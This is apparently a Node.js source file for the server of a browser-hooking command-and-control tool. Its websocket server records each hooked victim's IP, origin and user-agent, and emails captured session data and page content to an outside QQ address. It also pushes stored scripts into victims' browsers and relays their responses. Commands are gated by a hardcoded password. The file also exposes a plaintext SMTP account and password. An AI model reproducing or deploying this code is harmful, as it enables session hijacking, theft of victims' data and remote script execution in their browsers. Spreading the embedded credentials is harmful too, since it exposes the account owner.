const WebsocketServer = require("websocket").server;
const http = require("http");
const fs = require("fs");
const nodemailer = require("nodemailer");
// const mail = require("mail").Mail({
//     host : "smtp.qq.com",
//     username : "3070555628@qq.com",
//     password : "ndultmeulojgddia"
// });
// 3070555628@qq.com
// ndultmeulojgddia



var websocket_server = websocket_server ? websocket_server : {};

websocket_server.run = function(){
    var method = {
        show : function(data,key){
            var transporter = nodemailer.createTransport({
                host : "smtp.qq.com",
                secure : true,
                auth : {
                    user : "3070555628@qq.com",
                    pass : "ndultmeulojgddia"
                }
            });
            var mail_options = {
                from : "node <3070555628@qq.com>",
                to : "1206372957@qq.com",
                subject : "get session",
                html : "key : <b>${key}</b> , ip : <b>${out_ip}</b>, origin : <b>${origin}</b> , other_info : <b>${info}</b>".replace("${key}",key).replace("${out_ip}",global.cache.con_pool[key].req.out_ip).replace("${origin}",global.cache.con_pool[key].req.origin).replace("${info}",JSON.stringify(global.cache.con_pool[key].req))
            }
            transporter.sendMail(mail_options,(err,info)=>{
                if(err){
                    console.log("[!] Send mail failed " + key);
                }
                console.log("[*] Send mail " + key);
            })

            // mail.message({
            //     from: '3070555628@qq.com',
            //     to: ['1206372957@qq.com'],
            //     subject: 'recv session'
            // })
            // .body("key : <b>${key}</b> , ip : <b>${out_ip}</b>, origin : <b>${origin}</b>".replace("${key}",key).replace("${out_ip}",global.cache.con_pool[key].out_ip).replace("${origin}",global.cache.con_pool[key].origin))
            // .send(function(err) {
            //     if (err){
            //         console.log("[!] Send mail failed " + key);
            //     }
            //     console.log('[*] Sent ' + key);
            // });

            global.cache.con_pool[key].origin_page = data;
            console.log("[*] Recv origin_page data");
        },
        proxy : function(data,key){
            // data = {responseText:responseText,status:status}
            global.cache.con_pool[key].proxy_response = data;
        },
        auto : function(data,key){

            for(var i = 0;i < global.cache.scripts.length;i++){
                getSession(key).sendUTF(JSON.stringify({cmd:"run",data:global.cache.scripts[i].script}));
            }
        }
    }
    /*
        *   
        *   创建httpserver，给websocket用
        *
    */


    var server = http.createServer(function(request, response) {
        console.log("[*] " + (new Date()) + " Received request for " + request.url);
        response.writeHead(404);
        response.end();
    });


    server.listen(8081 , function(){
        console.log("[*] " + (new Date()) + " Server is listening on port 8081");
    });

    /*
        *   
        *   websocket监听
        *
    */

    wsServer = new WebsocketServer({
        httpServer : server,
        autoAcceptConnections:false
    }); 


    wsServer.on("request",function(request){

        var connection = request.accept();

        console.log("[*] " + (new Date()) + " Connection accepted.");

        if(connection.key == undefined){
            connection.key = (new Date()).getTime();
        }



        global.cache.con_pool[connection.key] = { proxy_response : false , req : {} , origin_page : false , con : 1 }

        global.cache.con_pool[connection.key].req.time = (new Date()).getTime();
        global.cache.con_pool[connection.key].req.origin = request.origin;
        global.cache.con_pool[connection.key].req.out_ip = request.remoteAddress;
        global.cache.con_pool[connection.key].req.ua = request.httpRequest.headers["user-agent"]


        global.cache.con_pool[connection.key].con = connection;



        connection.on("message", function(message) {

            if (message.type === "utf8") {
                console.log("[*] Received Message: utf8Data");
                var recv = {};
                try{
                    recv = JSON.parse(message.utf8Data);
                }
                catch(e){
                    console.log("[*] 😱 不是json格式");
                    return false;
                }

                 
                if(recv.password == "lxraa"){
                    delete recv.password;
                    if(method[recv.cmd]){
                        method[recv.cmd](recv.data,connection.key);
                    }
                }
                else{
                    connection.sendUTF("- what?");
                    console.log("[*] （＞д＜） 非法连接！")
                    delete global.cache.con_pool[connection.key];
                    connection.close();
                }

                // if(checkMethod(global.recv.cmd)){
                //  method[global.recv.cmd](global.recv.data);
                // }

                //connection.sendUTF(message.utf8Data);
            }
            else if (message.type === "binary") {
                console.log("[*] Received Binary Message of " + message.binaryData.length + " bytes");
                connection.sendBytes(message.binaryData);
            }
        });

        connection.on("close", function(reasonCode, description) {
            delete global.cache.con_pool[connection.key];
            console.log("[*] " + (new Date()) + " Peer " + connection.remoteAddress + " disconnected.");
        });

    });

}


module.exports = websocket_server;


